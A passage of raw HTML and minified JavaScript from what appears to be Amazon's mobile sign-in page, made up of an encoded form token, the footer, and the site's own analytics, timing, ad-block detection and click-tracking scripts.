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"></form>
    </div>
  </div></div>


  </div>
</div>

      </div>

      
      
  <!-- NAVYAAN FOOTER START -->
  <footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
    
    
    
    
        <div class="icp-container-mobile">
          
            
<style type="text/css">
  #icp-touch-link-language { display: none; }
</style>


<a href="#" aria-label="Choose a language for shopping." class="icp-touch-link-2" id="icp-touch-link-language">
  <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">English</span><span class="nav-arrow icp-up-down-arrow"></span>
</a>



          
          
          
            
<style type="text/css">
#icp-touch-link-country { display: none; }
</style>
<a href="#" aria-label="Choose a country/region for shopping." class="icp-touch-link-2" id="icp-touch-link-country">
  <span class="icp-flag-3 icp-flag-3-us"></span><span class="icp-color-base">United States</span>
</a>

          
        </div>
    
    
    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Conditions of Use</a>
    
    </li>
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Privacy Notice</a>
    
    </li>
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Consumer Health Data Privacy Disclosure</a>
    
    </li>
    <li class="nav-li">
    <a href="" id="" class="nav-a">Your Ads Privacy Choices</a>
    
    </li>
    <li class="nav-li">
    
    <span id="nav-icon-ccba" class="nav-sprite"></span>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-2024, Amazon.com, Inc. or its affiliates
</div>
<div id="nav-ftr-legal">
</div>

 
</footer>
<div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"><iframe id="DAsis" src="//aax-eu.amazon-adsystem.com/s/iu3?d=amazon.fr&amp;slot=navFooter&amp;old_oo=0&amp;ts=1647832891160&amp;s=ASAhyvbc3b0X4BRk_cnqCFHHDZv_D7o_YPneuYUizSei&amp;gdpr_consent=&amp;gdpr_consent_avl=&amp;cb=1647832891160" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" sandbox=""></iframe></div><script>(function(a,b){a.attachEvent?a.attachEvent("onload",b):a.addEventListener&&a.addEventListener("load",b,!1)})(window,function(){setTimeout(function(){var el=document.getElementById("sis_pixel_r2");el&&(el.innerHTML='<iframe id="DAsis" src="//aax-eu.amazon-adsystem.com/s/iu3?d=amazon.fr&slot=navFooter&old_oo=0&ts=1647832891160&s=ASAhyvbc3b0X4BRk_cnqCFHHDZv_D7o_YPneuYUizSei&gdpr_consent=&gdpr_consent_avl=&cb=1647832891160" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" sandbox></iframe>')},300)});</script>

  <!-- NAVYAAN FOOTER END -->


      
      <!-- NAVYAAN BTF START -->
<script type="text/javascript">
    var component = 'navCF';
    try {
      (window.AmazonUIPageJS ? AmazonUIPageJS : P).register(component, function(){return {};});
    }
    catch(e) {
      var error = e.message.toLowerCase();
      var alreadyRegisteredMsg = component + ' already registered';

      if (error.indexOf(alreadyRegisteredMsg.toLowerCase()) === -1) {
        throw(e);
      }
    }
</script>


  <script type="text/javascript">
      window.$Nav && $Nav.when('$').run('CBIMarketplaceRedirectOverlayNavyaan', function($) {
              $.ajax({
                  type: 'POST',
                  url: '/cross_border_interstitial/render',
                  data: JSON.stringify({
                      marketplaceId: 'A13V1IB3VIYZZH',
                      localCountryCode: 'FR',
                         customerId: null,
                      sessionId: '258\x2D8387710\x2D9157813',
                      deviceType: 'MOBILE',
                      referrer: '',
                      url: '\x2Fap\x2Fsignin',
                      pageType: 'Standard',
                      languageOfPreference: 'fr_FR',
                      queryParams: {},
                      weblabTreatmentMap: {"CROSS_BORDER_INTERSTITIAL_ES_US_340017":"C","CROSS_BORDER_INTERSTITIAL_EG_302080":"C","NARX_GOLDBOX_REDIRECTION_319969":"C","CROSS_BORDER_INTERSTITIAL_MX_US_341718":"C","CBI_355055":"C","NARX_INTERSTITIAL_NEW_CX_372291":"C","MWEB_CROSS_BORDER_INTERSTITIAL_SG_366762":"C","MWEB_CROSS_BORDER_INTERSTITIAL_SE_366766":"C","MWEB_CROSS_BORDER_INTERSTITIAL_SA_366767":"C","MWEB_CROSS_BORDER_INTERSTITIAL_PL_366768":"C","MWEB_CROSS_BORDER_INTERSTITIAL_NL_366769":"C","MWEB_CROSS_BORDER_INTERSTITIAL_AU_366773":"C","MWEB_CROSS_BORDER_INTERSTITIAL_AE_366771":"C","MWEB_CROSS_BORDER_INTERSTITIAL_EG_387234":"C"}
                  }),
                  contentType: "application/json",
                  dataType: "html",
                  success: function(data) {
                      if (data) {
                          $('body').append(data);
                      }
                  }
              });
      });
  </script>




<!-- NAVYAAN BTF END -->

    </div>

    

<script type="text/javascript">
  try {
    var metadataList = document.getElementsByName('metadata1');
    if (metadataList.length == 0) {
      var input = document.createElement('input');
      input.name = 'metadata1';
      input.type = 'hidden';
      input.value = 'true';

      var authenticationFormList = document.getElementsByName('signIn');
      for (var index = 0; index < authenticationFormList.length; index++) {
        authenticationFormList[index].appendChild(input);
      }
    } else {
      for (var index = 0; index < metadataList.length; index++) {
        metadataList[index].value = 'true';
      }
    }
  } catch (e) {
    if (typeof window.ueLogError === 'function') {
      window.ueLogError(e, {
        message: 'Failed to populate default metadata value',
        logLevel: 'warn',
        attribution: 'FWCIMAssets'
      });
    }
  }
</script>
<script type="text/javascript">
    window.fwcimCmd = [
        
            ['profile', 'signIn']
            
        
    ];
</script>


    



   

<!-- cache slot rendered -->

  </div><div id="be" style="display:none;visibility:hidden;">
  <form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="2"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {
(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
            ue.uels("https://images-eu.ssl-images-amazon.com/images/I/31YXrY93hfL.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function m(g){b=g||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};if(a.csa){var c;b.timing.transitionStart&&(c=b.timing.transitionStart);b.timing.processStart&&(c=b.timing.processStart);c&&(csa("PageTiming")("mark","nativeTransitionStart",c),csa("PageTiming")("mark","transitionStart",c))}e.ue.exec(n,"csm-android-check")()&&b.tags instanceof Array&&(g=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<
b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",g&&(b.transition.type=g));"reload"===f._nt&&e.ue_orct||"intrapage-transition"===f._nt?d&&d.timing&&d.timing.navigationStart?b.timing.transitionStart=d.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof f._nt&&d&&d.timing&&d.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&a.history.length&&1!=a.history.length&&(b.timing.transitionStart=d.timing.navigationStart);
g=b.transition;c=f._nt?f._nt:void 0;g.subType=c;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");f.isl&&a.uex&&a.uex("at","csm-timing");p()}function q(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function n(){return a.cordova&&a.cordova.platformId&&"android"==a.cordova.platformId}function p(){try{a.P.register("AMZNPerformance",function(){return b})}catch(g){}}function k(){if(!b)return"";ue_mbl.cnt=null;for(var a=b.timing,c=b.transition,a=["mts",l(a.transitionStart),"mps",l(a.processStart),
"mtt",c.type,"mtst",c.subType,"mtlt",c.launchType],c="",d=0;d<a.length;d+=2){var f=a[d],e=a[d+1];"undefined"!==typeof e&&(c+="&"+f+"="+e)}return c}function l(a){if("undefined"!==typeof a&&"undefined"!==typeof h)return a-h}function r(a,c){b&&(h=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=k)}var f=e.ue||{},h=e.ue_t0,d=a.performance,b;if(a.P&&a.P.when&&a.P.register)return 1===a.ue_fnt&&(h=a.aPageStart||
e.ue_t0),a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:m,failCallback:q})}),{cnt:k,ajax:r}},"mobile-timing")(ue_csm,ue_csm.window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,ue_csm.window);

ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",a.exec(g,"fcli-bfu")),a.attach("pagehide",a.exec(g,"fcli-ph"))),m&&b.setTimeout(a.exec(c,"fcli-t"),m),a._ffci=a.exec(c))})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "AuthenticationPortal";

var ue_spty = "SignInClaimCollect";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js?adtag=csm&act=ads_",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(z){}d=void 0}var g=
"csm:adb",c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);





ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,g){var c=a.srcElement||a.target||{},b={k:v,t:g.t,dt:g.dt,x:a.pageX,y:a.pageY,p:e.getXPath(c),n:c.nodeName};a.button&&(b.b=a.button);c.type&&(b.ty=c.type);c.href&&(b.r=e.extractStringValue(c.href));c.id&&(b.i=c.id);c.className&&c.className.split&&(b.c=c.className.split(/\s+/));h+=1;e.getFirstAscendingWidget(c,function(a){b.wd=a;d.ue.log(b,r)})}function w(a){if(!x(a.srcElement||a.target)){m+=1;n=!0;var g=f=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:g,dt:c})},y)}}function z(a){if(a){var b=a.filter(A);a.length!==b.length&&(q=!0,k=d.ue.d(),n&&q&&(k&&f&&d.ue.log({k:B,t:f,m:Math.abs(k-f)},r),l(),q=!1,k=0))}}function A(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},d=!1;Object.keys(c).forEach(function(a){var e=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==e.indexOf(a)&&(d=!0)})});return d}function x(a){if(!a)return!1;var b=(e.extractStringValue(a.nodeName)||"").toLowerCase(),c=(e.extractStringValue(a.type)||"").toLowerCase(),d=(e.extractStringValue(a.href)||"").toLowerCase();a=(e.extractStringValue(a.id)||"").toLowerCase();var f="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==f.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function l(){n=!1;f=0;b.clearTimeout(s)}function C(){b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",h);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",h/m*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&
d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var y=d.ue_unrt,r="cel",v="unr_mcm",B="res_mcm",p=b.performance,e=d.ue_utils,n=!1,f=0,s=0,q=!1,k=0,h=0,m=0;b.addEventListener&&(b.addEventListener("mousedown",w,!0),b.addEventListener("beforeunload",l,!0),b.addEventListener("visibilitychange",l,!0),b.addEventListener("pagehide",l,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&b.ue.onunload&&C();(new MutationObserver(z)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


